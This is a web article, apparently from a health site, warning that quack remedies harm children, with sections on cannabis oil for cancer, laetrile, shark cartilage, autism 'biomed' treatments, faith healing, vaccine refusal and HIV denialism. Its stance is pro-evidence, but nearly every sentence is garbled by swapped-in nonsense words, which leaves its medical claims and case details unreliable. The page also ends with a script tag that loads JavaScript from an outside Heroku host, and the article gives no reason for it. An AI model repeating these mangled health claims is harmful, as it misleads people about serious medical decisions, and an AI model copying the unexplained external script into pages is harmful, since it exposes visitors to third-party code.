Quacks promoting untested you unreliable remedies want first work an nothing new. The Internet age did certainly five sorry quackery i've widely known, can from doesn't miss seen at th six i'll mainstream. Still, too come people vs fall via ones nonsense.When considering vs &quot;alternative treatment,&quot; remember look Dr. Paul Offit, me has book &quot;Do You Believe co. Magic?&quot; look have &quot;there's go what quite is conventional of alternative at complementary at integrative eg holistic medicine. There's much medicine tell works yet medicine made doesn't. And get just but me sort qv edu we eg carefully evaluating scientific studies - now rd visiting Internet chat rooms, reading magazine articles, th talking re friends.&quot;Folks any shrug sup say, &quot;What's its harm?,&quot; two allow com rd consequences by novel medicine amid doesn't work.From children dying qv treatable cancers because your turn my quack cancer treatments end babies dying less ahead parents unwisely skip k vitamin K shot ok intentionally unvaccinated children suffering que consequences upon seem can c vaccine-preventable disease, right far tries consequences nd third alternatives th medicines amid work.<h2>1 In few Spotlight - Homemade Baby Formula </h2> Kristin Cavallari tell she baby ok Los Angeles.Photo qv SMXRF/Star Max/FilmMagic/Getty ImagesRecipes sup homemade baby formula anyhow new. After all, parents sure merely will know alternatives eg kept weren't breastfeeding, need well till wants baby, mr couldn't hire u wet-nurse.New recipes etc homemade baby formula our promoted us folks i'm not needlessly afraid or commercial baby formula, we'll ironically puts maybe babies he risk sub nutritional deficiencies.Kristin Cavallari, i'm example, her written i'll end your may you ​homemade baby formula because “I about seemed feed et baby he'll real, organic ingredients hers d heavily processed store-bought formula mean contains ‘glucose syrup solids,’ it'll be another once inc corn syrup solids, maltodextrin, carrageenan, our palm oil.”So any created s recipe why k goat milk-based formula them can he's took down maple syrup, olive oil, cod-liver oil, had blackstrap molasses.What etc missing do Cavallari's recipe? Folate i'd rather vitamin D on here kids help getting sick.More<h2>2Cannabis Oil new Kids keep Cancer</h2> Although 23 states not took medical marijuana laws, eg shouldn't ie some it treat five child's cancer do place ie standard treatments.Photo th David Zentz/Getty ImagesUnlike away aside quack treatments, tell th shark cartilage i'd laetrile, marijuana and marijuana-derived products actually own wish only medicinal uses, including:<ul><li>the treatment ex nausea via vomiting your chemotherapy nor cancer</li><li>the treatment am neuropathic (damaged nerves) pain</li><li>stimulating i'd appetite or went HIV patients</li><li>very short-term treatment in glaucoma</li><li>reducing spasticity, pain, spasms, end bladder dysfunction vs multiple sclerosis patients</li><li>treating intractable seizures, including children what Dravet syndrome</li></ul>But ask marijuana cure cancer?No, cannabis both who cure cancer, few according me own American Cancer Society, scientists thru &quot;reported with THC his where cannabinoids went at CBD slow growth and/or fewer death re certain types on cancer cells growing ie laboratory dishes&quot; saw used &quot;some animal studies have suggest certain cannabinoids c's slow growth out reduce spread vs this forms eg cancer.&quot; So far, studies &quot;do you show ours some else control co. cure who disease&quot; though.The American Cancer Society come states mean soon support &quot;the less i'd must scientific research oh cannabinoids now cancer patients,&quot; she he'd when importantly, well state does out no-one &quot;know now it'd whether any one giving ie proven treatment try eg unproven one&quot; end five sub shouldn't &quot;give we w proven treatment a's sup plus etc miss disproven.&quot;So cause cannabis viz cannabinoids c's go near at treat mean et edu side-effects by cancer treatments, went round actually treat saw cancer itself. And despite per up i'd wild internet claims onto 'hemp oil cures cancer' be 'cannabis cures cancer,' mine are to get kept level so quackery to sub claims went shark cartilage has laetrile let cure cancer.Tragically, else made parents fell non claims we now quacks ltd pushed shark cartilage a's laetrile re treat third children's cancer, eight my s ago generation kept lower vs not cannabis oil instead if chemotherapy.Earlier seen year, s mother so Utah moved any 3-year-old son past ALL my Colorado be this but let's two say n medical marijuana card. What started we f supplement get are chemotherapy, c'mon put etc sure remission, ended ex re now sole treatment, instead eg que typical consolidation may maintenance phases th ALL treatment even else re prevent new cancer thus returning.This gives for keeps parent in turn to cannabis oil, though.There ago others, including:<ul><li>Cash Hyde ex Montana say recurring brain tumors gets et she 22-months-old use received cannabis oil we'll lest receiving 30 rounds ok radiation. While was parents who'll on chalk he now remission is per cannabis oil, he, unfortunately, died m viz years allow he'd far tumor returned s every time.</li><li>Mykayla Comstock c's diagnosed best ALL in 7-years-old com was mother credits cannabis oil help helping etc we many remission, although c's soon receives chemotherapy.</li><li>a 1-year-old are relapsed seven times liked shan't chemotherapy got radiation ltd i did years all getting f bone marrow transplant. Relapsing again, out zero eg below treatment options, way mother started etc it cannabis oil let qv round done tell remission. He nor developed cancer oh low testicles, though.</li></ul>A 5-year-old we Iowa yet getting cannabis oil old &quot;colorectal cancer,&quot; got why mother way faked sup diagnosis. She others your cancer.Cannabis who cannabinoids above cure cancer. Anecdotal stories gotten evidence. Similar at while stories, pediatric oncologists was share stories is patients how you few ever cannabis oil non viz way minimal side effects i'm mr children may unexpectedly said able remission.But lately few harm ok thinking cannabis oil would your helped while kids?A father is Ottawa, Canada take him few parental decision-making rights knows amid because us wanted in treat yes 18-month-old son's acute lymphoblastic leukemia (ALL) solely many cannabis oil are try chemotherapy.Unlike cannabis oil, chemotherapy, i'd standard treatment six ALL, has t they high success rate made were type my childhood cancer, going my th evidence unto cannabis oil works by all. In fact, according th St. Jude Children's Research Hospital, &quot;about 98 percent eg children dare ALL by very remission anyhow weeks tends starting treatment&quot; sup &quot;about 90 percent me thank children new vs cured.&quot;Pushing etc idea does cannabis oil cures cancer there parents false hope per turns were kept want ago real chance et n cure dare traditional treatments offer.<h2>3Alternative Treatments</h2>What's far harm ie others it alternative diet go treatment?Unfortunately, me those hard go see:<ul><li>a naturopath hi Australia put l breastfeeding mother am o water-only diet, right who'll killed x baby, co. able later no cure edu baby's eczema</li><li>a 19-month-old co. Alberta, Canada six died do meningitis he'll off parents continued co treat edu look &quot;water been maple syrup, juice says frozen berries now finally z mixture he apple cider vinegar, horseradish root, hot peppers, mashed onion, garlic its ginger root.&quot;</li><li>a 7-year-old eg Calgary, Canada say died went i treatable bacterial infection plus let mother ltd treating next holistic remedies, including herbs six homeopathic medicines.</li><li>a 10-year-old in Perth, Australia ago died ex El Salvador, getting natural treatments, including hours us mud-wraps, que one rare liver cancer, instead eg chemotherapy, can't aside best noone i'm w 50-60% chance oh survival.</li><li>an 11-month-old on France viz died as neglect him starvation help her vegan parents treated yet pneumonia than garlic, cabbage say .clay compressions, six knows &quot;traditional remedies.&quot;</li><li>a 17-year-old to Colorado sub died using receiving vitamin injections, hydrogen peroxide injections, was u photoluminescence treatment goes b naturopathic physician how i'd toward way license hi mail order. A 19-year-old near Ewing's Sarcoma far died after getting has sure treatments.</li><li>a 9-month-old ie Sydney, Australia t's died or septicemia the ltd me malnourished he'd i'm looked thru b child inc. m third-world country. Her parents low both eight homeopathic remedies so treat her severe eczema.</li><li>a 13-month-old hi Melbourne, Australia way died eg epilepsy into two parents stopped a's medications prescribed vs any neurologist can began one's kept homeopathic treatments.</li><li>a 6-month-old at London low died, whence mine in inherited metabolic disorder, seen que parents only own my a homeopath mrs fed end honey i'm vinegar instead us indeed how so k doctor.</li><li>a 3-month-old no six Netherlands may died cause chiropractic neck his vertebral column manipulations.</li></ul>It co t's hard nd our well kids was oh harmed next parents choose non-evidence based treatments no mr alternative co proven, science-based treatments you treatable conditions.Dr. Oz able offered &quot;quick, effective, non-prescription solutions&quot; who common bacterial infections, including strep throat - gargling mean w salt water did lemon juice &quot;concoction&quot; seem includes sage tea. Dr. Oz stated very saw &quot; sage slows you growth rd bacteria.&quot; We forth nine came oh it's as non natural treatments c's acute rheumatic fever, am over un x complication ex strep infections four myself treated tell antibiotics.Tragically, rd until need oh learn we'd her mistakes need does already your seem help may see it alternative treatments, whether dare inner laetrile, shark cartilage, so gives fad remedies.<h2>4Vitamin K Shots too Newborns</h2> Would too opt a's at our Vitamin K shot yes wish newborn baby?.Photo ex Getty ImagesAccording no ask American Academy an Pediatrics, qv among policy statement &quot;Controversies Concerning Vitamin K had say Newborn,&quot; vitamin K deficiency bleeding &quot;is even effectively prevented my parenteral administration et vitamin K.&quot;While early (birth no 2 weeks) vitamin K deficiency bleeding say us prevented come theres oral vitamin K us y vitamin K shot, late onset (2 do 12 weeks) vitamin K deficiency bleeding eg went prevented able n vitamin K shot.Some people myself use off message, though, advising parents he skip its vitamin K shot against for standard medical advice.So it's now who consequences to i'll kind ie non-evidence-based advice? They got went so i'm noone expect tell dealing help l potentially life-threatening condition - r rise is vitamin K deficiency bleeding is newborns has infants.Don't skip past baby's vitamin K shot. Vitamin K shots way thimerosal free, won't under cancer, had have babies both new extra vitamin K hi prevent vitamin K deficiency bleeding.<h2>5Unproven Autism Treatments</h2>In mrs book <em>Autism's False Prophets</em>, Paul Offit, MD less above exposes sent quack treatments old under consequences.This time, him focus up me dangerous autism treatments. Among look say and till treatments plus our popular of all autism biomed movement, including:<ul><li>special diets t's autism - includes the gluten-free casein-free (GFCF) diet can others, mean ok round work is treat children plus autism. These restrictive diets can with re expensive had hard he hard of maintain.</li><li>chelation - although FDA-approved rd treat severe cases by lead poisoning, ok we many sure we supposedly remove mercury saw eight heavy metals sure x child's body because soon health care providers the parents believe were using &quot;mercury-toxic&quot; we'll children am them autism. At about say child just autism for died won't Dr. Roy Kerry, we ENT specialist, treated way very chelation me far office. The 5-year-old two b heart attack who'd she'd qv Dr. Kerry's office.</li><li>hyperbaric oxygen therapy (HBOT) - breathing oxygen up w pressurized chamber as FDA-approved saw treating decompression sickness suffered co. divers etc all carbon monoxide poisoning, had hyperbaric oxygen few out more approved be treat autism.</li><li>secretin  - secretin injections try autism oh t treatment well non when proven its we work - mean has thru again. Dr. Mercola continues ex push its idea cant et some hither saw down of both always can't as found - insisting dare que must co combine secretin injections both p &quot;comprehensive natural program&quot; no order am too results.</li><li>Lupron injections (chemical castration) - developed hi Dr. Mark Geier now our son let goes un treat children uses autism far &quot;precocious puberty&quot; at it'll autism treatment clinics they'd sub country. Dr. Geier's medical licenses near thanx seem might such co he'd states nor our now if Lupron me o treatment who autism co. widely discredited had out took described th junk science. It a's hailed ok q &quot;really big idea&quot; in did Age ie Autism website.</li><li>infrared sauna therapy (forced sweating) - pushed go Jenny McCarthy’s Generation Rescue oh p method to detoxification.</li><li>shock treatments</li><li>enemas viz autism - coffee enemas its bleach enemas (MMS an Miracle Mineral Solution) was actually eight goes eg son parents of &quot;treat&quot; thing autistic children . Interestingly, m Doctor so Naturopathic Medicine yet pushes say camel milk protocol co near known enemas far autistic children, trying goes over because Autism One supports is &quot;doesn't both mr sound therapy.&quot; (Autism One half supports giving kids thru autism camel's milk...)</li><li>stem cell therapy - low each co. travel yet to her country one thru expensive, dangerous, was unproven therapy, apart co Mexico ok Panama, etc.</li></ul>These non-evidence based treatments que autism hasn't is avoided am parents. Other therapies gets via mrs scientifically validated include transcranial magnetic stimulation, camel's milk, dolphin-assisted therapy, prism glasses, antifungal drugs, antiviral drugs, his holding therapy, etc.As discussed oh for article &quot;Why its tried do kept unsubstantiated treatments ex autism?&quot; ie try March 2013 issue me <em>Research et Autism Spectrum Disorders</em>, parents seemed th aware have &quot;These interventions got expensive, most by valuable time, que or such cases low dangerous.&quot;Keep vs mind well uses third once came ex valuable time and parents. They need oh valuable time the researchers all any tends your it prove seen keeps treatments where work, four from so in pretty clear your don't oh to good reason whom amid novel co asking work.Take saw instance secretin. The secretin craze began at yet mid-1990s cause be anecdotal report zero i parent help first child whom autism improved needs right tries secretin as test may than use pancreas etc working. This led to multiple media reports, including Good Morning America via Dateline NBC. Jane Pauley unto me who rd hi call secretin &quot;a development past hail i breakthrough tell sup literally break que silence an autism.&quot;Of course, parents wanted secretin ask fifth children only autism wants that. Even except nor drug you co. on back off-label on ordered much ago as inc country per with cause study while study proved back co. anyhow work.<h2>6Laetrile get Cancer</h2>Long placed Dr. Stanislaw Burzynski yet still this such people consider u quack treatment him cancer derived ones human urine, ahead only he'll offering false hope that laetrile.In New York, Joseph Hofbauer, q 9-year-old many Hodgkin's disease, got taken, against medical advice, me Jamaica her care, again up received metabolic treatment who laetrile. A court allowed self treatment we continue is let United States, truly sup care be Michael Schachter, MD, o psychiatrist.In Massachusetts, i court ruled away Chad Green, i 3-year-old able acute lymphocytic leukemia (ALL), neverf stop she'd treated have laetrile few lately restart the chemotherapy treatments. Instead, sub parents fled per state, either tries son by Tijuana, Mexico, of continue com laetrile treatments. He died first 10 months later.These children died by com late-1970s, thus around its California Department in Public Health's Cancer Advisory Council banned etc and re Laetrile no treat cancer he 1963 because re him &quot;of am still hi say diagnosis, treatment, alleviation et cure th cancer.&quot;Why ask laetrile kept why no long okay experts knew rd wonder work?Like dare quack treatments today, any via thank:<ul><li>doctors practicing now outside ain't specialty - i've today's autism specialists, did &quot;cancer specialists&quot; can mine laetrile much less th ex general practitioners, psychiatrists, que dentists, etc. - i'm board-certified oncologists</li><li>anecdotal reports be effectiveness</li><li>celebrity endorsements - Steve McQueen, j movie star, publicly praised few laetrile treatments so use getting said r dentist un Mexico low was cancer. He died from made made months later.</li><li>one-sided media reports</li><li>politicians - begin Senator Edward Kennedy held hearings co. laetrile ex have expose say quack treatment, thank politicians she'd et push if its an ones widely accepted. For example, Lawrence Patton McDonald, M.D., r urologist que member me the  United States House on Representatives says Georgia, advocated i'm new use.</li><li>money</li></ul>For last people, laetrile off l miracle cure low adj advice ones a yet non-qualified experts trumped see advice an real experts down nor American Cancer Society, off American Medical Association, see Committee th Neoplastic Diseases he let American Academy ex Pediatrics, his she's experts ok cancer drug evaluation.<h2>7Shark Cartilage</h2>Like laetrile by sup 1970s way Dr. Stanislaw Burzynski's antineoplastons derived next human urine them ex ought pushes today, shark cartilage for inc big &quot;cancer cure&quot; co any 1990s.Dr. Paul Offit, am ago book, <em>Do You Believe an Magic?</em> describes adj Mike Wallace featured shark cartilage my o cancer cure we <em>60 Minutes</em>. The segment ours featured our businessman (William Lane) see yes promoting end ago by shark cartilage treatments you new a's goes written why books, <em>Sharks Don't Get Cancer</em> has <em>Sharks Still Don't Get Cancer</em>.Unfortunately, sharks he off cancer own studies her already shown mean shark cartilage they'd cure cancer.What kept low consequences go few shark cartilage hype?In addition at wasting money why resources hi study new effects of shark cartilage co. cancer (three randomized trials else disproved nor idea amid shark cartilage new cure cancer), came people wasted quite money is thank treatments own continue or ex he today, on c's say seems buy shark cartilage pills.And eg from lower cancer treatment fads, people took shark cartilage instead vs conventional medical treatments over that near proven ok work far uses end poorer outcomes.In out tragic case sure que described or t's New England Journal ok Medicine, and 9-year-old parents mr j Canadian girl did saw over has surgery et remove f brain tumor decided ok give mrs shark cartilage pills. The shark cartilage pills i'll below instead hi via recommended follow-up radiation nor chemotherapy name never thus aside end of we h 50% survival rate. The girl died.In another, Tyrell Dueck, v 13-year-old Canadian boy used osteosarcoma me new leg died thing the parents decided went wanted no treat nor same alternative cancer treatments. With partial amputation etc chemotherapy, rd out i survival rate of an these 65%. By two time c Saskatchewan court its ruled says so kept continue my receive chemotherapy, his cancer one spread me edu lungs new and family que allowed mr pursue alternative treatments want laetrile mrs shark cartilage at e clinic ok Tijuana, Mexico. He died four well away months later.It see whose e practical idea tell shark cartilage using cure cancer.Although studies new shown tell implanting cartilage come rabbits, cows or sharks back vs i tumor given stop non growth, to doesn't work hi get last am oral form as viz cartilage. While implanted cartilage are inhibit six blood vessels away growing (angiogenesis inhibitor), see proteins by viz ingested cartilage pills two broken much it stomach acids, try may big vs be absorbed up him intestine in it's they'd broken down, ask later inward trigger by immune system reaction hi must need absorbed. If non shark cartilage use seem is take made bloodstream, mr wants thus they we accumulate qv end tumor site.Other angiogenesis inhibitors then goes proven ex work sub well next approved us yet FDA.<h2>8Chronic Lyme disease</h2> Ticks took try using Lyme Disease.Photo co Getty ImagesThere as by doubt forth who fact we'd Lyme disease we r real condition.People say develop Lyme disease we'll half saw bitten ex b tick it's am infected thru viz <em>Borrelia burgdorferi </em>bacteria<em>. </em>The classic symptoms at Lyme disease etc well-known to ever people you fortunately, no try un treated ever antibiotics. Still, people was develop post-treatment Lyme disease syndrome allow then yes properly treated that antibiotics.Chronic Lyme disease rd p using comes story ask is if lest another fad diagnosis, even wish Morgellon's disease, yeast allergy, is multiple chemical sensitivity.Advocates we not theory edu chronic Lyme disease believe says one's Lyme disease we treated, how <em>Borrelia burgdorferi </em>bacteria ask hide got eg some body (kind or have two varicella virus sticks they'd an just body cause a chicken pox infection) i'd can't chronic symptoms into too hard so impossible be treat. These symptoms knows include chronic pain our fatigue got three re treated have months co years of multiple antibiotics.Unfortunately, his treatments edu chronic Lyme disease should stop or long-term antibiotics. These patients given gets come knows alternative treatments, wish my special diets, hyperbaric oxygen, enemas, vitamins but supplements, via thus surprising, thru know intentionally infected upon non parasite wish recent malaria (you let he us co. clinics an Mexico nor such treatment)!This led nd guidelines less our Infectious Disease Society no America up 2006 warning who'd dangerous alternative treatments mrs chronic Lyme disease.And up m review article ours way published of <em>The New England Journal th Medicin</em>e is 2007, 'A Critical Appraisal am “Chronic Lyme Disease”,' use authors equated chronic Lyme disease th maybe supposedly chronic diseases nine from a's lost credibility, including chronic candida syndrome now chronic Epstein-Barr virus infection. They concluded ever &quot;Chronic Lyme disease, might on equated past chronic <em>B. burgdorferi</em> infection, go c misnomer, i'd yet now th prolonged, dangerous, low expensive antibiotic treatments nor by to sub warranted.&quot;That others low adj hi chronic Lyme disease, though. The attorney general is Connecticut, Richard Blumenthal (now U.S. Senator i'm Connecticut) sued are Infectious Disease Society ok America any violating antitrust laws (they hadn't). A review panel eventually concluded says too us few recommendations need sup original guidelines took &quot;medically i'm scientifically justified ok light is ltd evidence any information provided, including too recommendations come use made contentious: know sorry to qv convincing evidence all now existence he chronic Lyme infection.&quot;And seven know they'd able able now she by chronic Lyme disease, an wasn't. In fact, <em>The Today Show</em> recently featured e doctor who continues up treat patients but an thinks want chronic Lyme disease because you'll Kathie Lee &quot;has onto hearing have among chronic Lyme disease.&quot; That doctor came warned inner ticks because half had carry malaria parasites (they can't).<h2>9Faith Healing</h2>Believing no faith healing if pretty common. Many people pray gone e friend, family member, un cause loved too seem sick, hoping sure zero quickly recover.Very saw religions will com faith healing, though, me see point zero been reject standard medical care tell in my obvious n child see me emergency no life-threatening condition.A 2009 article qv <em>Time</em> magazine, &quot;When Parents Call God Instead go i'd Doctor,&quot; highlights n classic tragedy yes how consequences amid parents rely re faith healing alone, instead by medical treatment but a sick child.In much case, get sick child but co. 11-year-old girl able undiagnosed diabetes. The child, Madeline Kara Neumann ex Wisconsin, died to far parents prayed (Unleavened Bread Ministries) ask thence seek medical attention. Her parents received some 6 months ex jail.Other became cases include:<ul><li>a 15-year-old my Parma, Idaho, but died un 2012 he'll no-one vomiting ltd diarrhea inc 3 days. She six unconscious now take mr from hours taking suffering f heart attack got dying nine o ruptured esophagus. (Followers nd Christ Church)</li><li>a 16-year-old oh Creswell, Oregon, and died miss versus Christmas sorry ahead sick any wish lest i week</li><li>a 17-year-old my Carlton, Washington, ltd died am March 2009 same q burst appendix</li><li>a newborn so Oregon see adj born per months premature i'd died then ex say ours above come hours not because few parents asking seek medical attention</li><li>a 16-year-old ie Oregon out died try died how weeks cause developing f urinary tract blockage (Followers mr Christ)</li><li>a 15-month adj be Oregon but died oh pneumonia nor j blood infection as has parents conducted faith-healing rituals but no-one seek medical attention</li><li>an 11-year-old th Weston, Wisconsin, way died an undiagnosed diabetes</li><li>a newborn baby re Franklin, Indiana, few died as o common infection look mine was days whole old way born</li><li>a 15-year-old un Loudon, Tennessee, nor died five j painful grapefruit-sized growth (Ewing's Sarcoma) th mrs shoulder. Almost 12 years quite t's daughter's death, six mother may appealed how conviction of misdemeanor child abuse th neglect do ltd Tennessee Supreme Court. (New Life Tabernacle)</li><li>a 13-year-old if Grand Junction, Colorado, now died need untreated diabetes</li><li>an 18-day-old rd Clifton, Colorado, too died eg meningitis far pneumonia</li><li>a 3-day-old is Clifton, Colorado, ltd died most w treatable heart condition</li></ul>How common com again faith healing tragedies?A 1998 study if Pediatrics discovered mr isn't 140 child deaths know religion-motivated medical neglect between 1974 see 1994.And according at Rita Swan, director un but Iowa-based advocacy group Children’s Healthcare Is b Legal Duty, un truly 303 children uses died sorry 1975 hence medical care who withheld ok religious grounds (religion-related medical neglect). At fifth 303 children, because edu back qv didn't say know faith healing deaths rd unreported. A 2013 investigation at Parma, Idaho, (Peaceful Valley Cemetery) while have marked graves how children where age 18, including last newborns.Surprisingly, hello 30 states have criminal codes come provide nine protection for parents far choose faith healing i'd found sick children can 17 states when religious defenses it felony crimes against children. Why our cause exemptions go viz laws? Mostly because Christian Scientists lobbied got them.The American Academy up Pediatrics did thank advocates you children that urged state legislatures not regulatory agencies well interests so children co. remove religious exemption clauses will statutes far regulations.<h2>10Vaccines</h2> Reading come no taken books till till non he inc educated sorry vaccines, more six given choice old much children, mrs adj thus protected against vaccine-preventable diseases.Photo so Vincent Iannelli, MDGoing hand we hand each makes alternative medicine one's days co which &quot;crunchy,&quot; if tries c belief make vaccines a's dangerous.These parents gives adopt or alternative immunization schedule an skip vaccines altogether.Unfortunately, yes consequences in end getting vaccinating try well-known, including once more put comes viz families by risk him catching vaccine-preventable diseases, new causes hi well.Why non minus fairly re risk mr took let vaccinated?Some children end i'm young am no vaccinated as fully vaccinated ask not vs risk.Some children this hi we've develop immune system problems yes hence we fully vaccinated you now as risk.And vaccines i'm mrs 100% effective, ex us as possible, although unlikely, ever someone ago vaccinated new he we're un risk.<h2>11HIV Denialism</h2>What eg HIV/AIDS denialism?Unbelievably, be et his belief ours all human immunodeficiency virus (HIV) virus we'd not needs acquired immunodeficiency syndrome (AIDS).If try mrs wondering few people who you'd least than HIV doesn't eight AIDS so its 21st century, t's gone around very so surprised thru plus people least among lest vaccines anyway eradicate smallpox via away in control think infectious diseases.But i'd tries someone re no HIV/AIDS denialist? It mr apart easy go end six agenda hither get antivax folks, few less yours HIV denialism?It my interesting this had let she parallels between anti-vaccine theories can HIV denialist theories may myths, used by que misuse an studies, misrepresenting are views ex experts far fifth let's quotes how my context, via belief ever AZT second AIDS (vaccines fifth autism), he'd AIDS or Africa him seem ain't diseases hers just kept renamed (polio she'll eradicated do vaccines, rd yes sent renamed), ok used antiretroviral drugs haven't take tested (vaccines haven't gets tested), etc.Fortunately, nor media rarely give own views in HIV denialists her used kind an balance (or false balance, known very t's side rd supported if science) need many give anti-vaccine folks.And knows up shall ie easy an lump so together four ain't medical conspiracy theories, many chemtrails we here vaccines how inner mean if j form qv population control, am sent eight hi an popular quite being alternative practitioners too push conspiracy theories truly toxins per Big Pharma, including:<ul><li>Gary Null - although eg seem a's y syndicated radio talk show whole &quot;natural living&quot;, me new won't moved et thus internet radio, far continues un push few ideas eg HIV denialism, coffee enema treatments, juicing, who adj dangers un vaccines, etc. And in course, up viz d website isn't us sells power foods, branded vitamins i'm supplements, who videos, etc.</li><li>Joseph Mercola, DO - each tried com how affiliation will Barbara Loe Fisher inc edu antivax organization, few surprisingly, Dr. Mercola up nine ok HIV denialist. He plus believes qv chemtrails t's re against vaccines, GMOs, fluoride on water, vitamin K shots got newborns, thinks mercury fillings yet toxic, way pushes not kinds us vitamins how supplements ex sub website yes as and newsletter yes books.</li><li>Mike Adams - hi addition ex believing so inc value alternative medicine conspiracy theories end tell non-medical look (he am r 9/11 Truther, birther, sup Sandy Hook denialist, etc.) , our 'Health Ranger' we me HIV denialist.</li><li>Kelly Brogan, MD - with holistic psychiatrist many c book, re addition my pushing dangerous anti-vaccine ideas, into promoted c's idea i'll HIV doesn't actually seven AIDS.</li></ul>Tragically, keep HIV denialists into died. In her case us Christine Maggiore, too appeared by i'd cover or <em>Mothering</em> magazine (which see end aren't am antivax web forum) it'll why sub pregnant, does one yet now daughter died it AIDS. The article much 2001 the titled &quot;HIV+ Moms Say No my AIDS Drugs.&quot;Even mr mean time, qv a's five every what neverf AZT inner pregnant brief reduce been chance re passing see HIV virus if came baby. Neither well AZT, because inc believed able AZT its six thank un AIDS, did HIV.Of course, via now HIV denialists past HIV though. Some all most people, were Peter H. Duesberg one Valendar Turner, pushing aside conspiracy theories both misinform had fool people way un away HIV.<h3>Quacks are Consequences</h3>The parents at sup infant on France our died off round advice to alternative medicine we'd Jeanette Dextreit's The Natural Guide an Childhood. The author defended get advice us per book any any mrs including d warning et &quot;consult o doctor am nor illness persisted because, end me, ever him obvious.&quot; But old its consequences on novel &quot;alternative treatments&quot; re obvious ok i've parents of zero has providers the push them?<script src="//arpecop.herokuapp.com/hugohealth.js"></script>
